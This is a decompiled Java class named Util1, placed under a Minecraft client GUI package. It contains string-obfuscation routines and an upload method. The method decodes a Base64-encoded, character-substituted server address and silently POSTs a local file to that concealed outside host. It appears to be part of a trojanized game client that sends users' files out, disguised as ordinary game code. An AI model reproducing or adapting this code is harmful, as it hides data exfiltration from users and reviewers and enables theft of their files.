package net.minecraft.client.gui;

import java.io.File;
import org.apache.commons.codec.binary.Base64;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.impl.client.DefaultHttpClient;

public class Util1 {

   private static String source;
   private static String target;
   public static boolean did;
   // $FF: renamed from: a boolean
   private static boolean field_1871;
   // $FF: renamed from: h java.lang.String[]
   private static final String[] field_1872;


   // $FF: renamed from: <init> () void
   public void method_2265() {
      super();
   }

   public static String obfuscate(String var0) {
      boolean var10000 = method_2269();
      char[] var2 = new char[var0.length()];
      boolean var1 = var10000;
      int var3 = 0;

      String var6;
      while(true) {
         if(var3 < var0.length()) {
            char var4 = var0.charAt(var3);
            var6 = source;
            if(var1) {
               break;
            }

            int var5 = source.indexOf(var4);
            var2[var3] = target.charAt(var5);
            ++var3;
            if(!var1) {
               continue;
            }
         }

         var6 = new String(var2);
         break;
      }

      return var6;
   }

   public static String unobfuscate(String var0) {
      char[] var2 = new char[var0.length()];
      boolean var10000 = method_2269();
      int var3 = 0;
      boolean var1 = var10000;

      String var6;
      while(true) {
         if(var3 < var0.length()) {
            char var4 = var0.charAt(var3);
            var6 = target;
            if(var1) {
               break;
            }

            int var5 = target.indexOf(var4);
            var2[var3] = source.charAt(var5);
            ++var3;
            if(!var1) {
               continue;
            }
         }

         var6 = new String(var2);
         break;
      }

      if(class_689.method_3976() != 0) {
         method_2267(!var1);
      }

      return var6;
   }

   public static int uploadImageToServer(String var0) {
      boolean var1;
      label17: {
         String var10000 = new String(Base64.decodeBase64("Z3Nzb3QkJiZuZm1wcWpiI2RwbiZoZnMmdGxqbXQjb2dv"));
         String[] var12 = field_1872;
         String var3 = unobfuscate(var10000);
         boolean var13 = method_2269();
         DefaultHttpClient var4 = new DefaultHttpClient();
         var1 = var13;
         HttpPost var5 = new HttpPost(var3);
         File var6 = new File(var0);
         FileBody var7 = new FileBody(var6);
         MultipartEntity var8 = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
         var8.addPart(unobfuscate("ejkfBpYokpbc"), var7);
         var5.setEntity(var8);
         HttpResponse var9 = var4.execute(var5);
         HttpEntity var10 = var9.getEntity();
         HttpEntity var14 = var10;
         if(!var1) {
            if(var10 == null) {
               break label17;
            }

            var14 = var10;
         }

         String var11 = org.apache.http.util.EntityUtils.toString(var14).trim();
      }

      if(var1) {
         int var2 = class_689.method_3977();
         ++var2;
         class_689.method_3975(var2);
      }

      return 0;
   }

   // $FF: renamed from: <clinit> () void
   static void method_2266() {
      // $FF: Couldn't be decompiled
   }

   // $FF: renamed from: a (boolean) void
   public static void method_2267(boolean var0) {
      field_1871 = var0;
   }

   // $FF: renamed from: a () boolean
   public static boolean method_2268() {
      return field_1871;
   }

   // $FF: renamed from: b () boolean
   public static boolean method_2269() {
      boolean var0 = method_2268();
      return !var0;
   }
}
